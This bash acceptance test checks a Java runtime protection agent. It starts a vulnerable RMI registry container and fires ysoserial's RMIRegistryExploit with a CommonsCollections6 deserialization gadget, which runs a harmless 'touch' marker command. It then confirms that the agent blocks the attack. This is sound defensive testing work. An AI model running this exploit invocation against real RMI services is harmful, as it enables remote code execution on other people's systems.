#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_RMI_REGISTRY_DIRECT_IMAGE:-vulhub/j2ee:8u111}"
attack_image="${OHMYRASP_VULHUB_RMI_REGISTRY_DIRECT_ATTACK_IMAGE:-vulhub/j2ee:8u222}"
baseline_name="${OHMYRASP_VULHUB_RMI_REGISTRY_DIRECT_BASELINE_NAME:-ohmyrasp-vulhub-rmi-registry-direct-baseline}"
protected_name="${OHMYRASP_VULHUB_RMI_REGISTRY_DIRECT_PROTECTED_NAME:-ohmyrasp-vulhub-rmi-registry-direct-protected}"
payload_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
registry_port="${OHMYRASP_VULHUB_RMI_REGISTRY_DIRECT_PORT:-1099}"
success_file="/tmp/ohmyrasp-rmi-registry-direct-success"
baseline_dir="logs/vulhub-rmi-registry-direct-java8-baseline"
protected_dir="logs/vulhub-rmi-registry-direct-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  local output="$3"

  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/${output}" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir" "container.log"
  copy_artifacts "$protected_name" "$protected_dir" "container.log"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

ensure_port_available() {
  local port="$1"
  if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
    echo "host port ${port} is already in use; RMI Registry direct acceptance uses host networking" >&2
    exit 1
  fi
}

prepare_ysoserial() {
  mkdir -p "$payload_dir"
  if [[ ! -s "${payload_dir}/ysoserial.jar" ]]; then
    rm -rf "${payload_dir}/src"
    docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
}

wait_for_registry() {
  local name="$1"
  local dir="$2"

  for attempt in $(seq 1 60); do
    if timeout 1 bash -c "</dev/tcp/127.0.0.1/${registry_port}" >/dev/null 2>&1; then
      printf 'registry_ready_attempt=%s port=%s\n' "$attempt" "$registry_port" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose RMI Registry on ${registry_port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 60); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "$protected_log" >&2 || true
  docker logs "$protected_name" >&2 || true
  echo "missing Java8 agent startup event for RMI Registry direct acceptance" >&2
  exit 1
}

run_exploit() {
  local dir="$1"
  local output="${dir}/rmi-registry-direct-client.log"
  local status

  set +e
  docker run --rm --network host \
    -v "${payload_dir}:/work:ro" -w /work "$attack_image" \
    /usr/local/openjdk-8/bin/java -cp ysoserial.jar \
      ysoserial.exploit.RMIRegistryExploit \
      127.0.0.1 "$registry_port" CommonsCollections6 "touch ${success_file}" \
    > "$output" 2>&1
  status=$?
  set -e
  printf 'client_status=%s\n' "$status" >> "${dir}/attempts.log"
}

wait_for_marker() {
  local name="$1"

  for _ in $(seq 1 20); do
    if docker exec "$name" sh -c "test -e '${success_file}'"; then
      return
    fi
    sleep 1
  done
  return 1
}

wait_for_block_event() {
  for _ in $(seq 1 20); do
    if grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
      return
    fi
    sleep 1
  done
  return 1
}

start_baseline() {
  docker run -d --name "$baseline_name" --network host \
    -e RMIIP=127.0.0.1 \
    "$image" >/dev/null
  wait_for_registry "$baseline_name" "$baseline_dir"
}

start_protected() {
  docker run -d --name "$protected_name" --network host \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/tmp/ohmyrasp-logs" \
    -e RMIIP=127.0.0.1 \
    "$image" \
    bash -lc 'java -javaagent:/tmp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/tmp/ohmyrasp-logs/events.jsonl -Dohmyrasp.java8.block=true -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=${RMIIP} -Djava.security.manager -Djava.security.policy=/root/client.policy -cp /root/train-1.0-SNAPSHOT-all.jar train.rmi.Server' \
    >/dev/null
  wait_for_registry "$protected_name" "$protected_dir"
  wait_for_protected_startup
}

run_baseline() {
  start_baseline
  docker exec "$baseline_name" rm -f "$success_file"
  run_exploit "$baseline_dir"

  if ! wait_for_marker "$baseline_name"; then
    docker logs "$baseline_name" >&2 || true
    cat "${baseline_dir}/rmi-registry-direct-client.log" >&2 || true
    echo "baseline RMI Registry direct exploit did not create ${success_file}" >&2
    exit 1
  fi

  printf 'marker=present\n' >> "${baseline_dir}/attempts.log"
  copy_artifacts "$baseline_name" "$baseline_dir" "container.log"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  start_protected
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected RMI Registry direct container produced a detection before exploit traffic" >&2
    exit 1
  fi

  docker exec "$protected_name" rm -f "$success_file"
  run_exploit "$protected_dir"

  if ! wait_for_block_event; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    cat "${protected_dir}/rmi-registry-direct-client.log" >&2 || true
    echo "missing java8_deserialization_gadget_class block event for RMI Registry direct exploit" >&2
    exit 1
  fi
  if ! grep -Fq '"class":"org.apache.commons.collections.functors.ChainedTransformer"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "RMI Registry direct block event did not identify ChainedTransformer gadget class" >&2
    exit 1
  fi
  if docker exec "$protected_name" sh -c "test -e '${success_file}'"; then
    cat "$protected_log" >&2 || true
    echo "protected RMI Registry direct exploit created ${success_file} despite Java8 RASP" >&2
    exit 1
  fi

  printf 'marker=absent\n' >> "${protected_dir}/attempts.log"
  copy_artifacts "$protected_name" "$protected_dir" "container.log"
  docker rm -f "$protected_name" >/dev/null 2>&1 || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
ensure_port_available "$registry_port"
prepare_ysoserial

docker image inspect "$image" >/dev/null 2>&1 || docker pull "$image" >/dev/null
docker image inspect "$image" --format '{{json .Config.Env}}' > "${baseline_dir}/image-env.json"
docker run --rm --entrypoint /bin/bash "$image" -lc 'java -version' \
  > "${baseline_dir}/java-version.log" 2>&1

run_baseline
ensure_port_available "$registry_port"
run_protected

echo "vulhub Java RMI Registry direct Java8 acceptance passed"
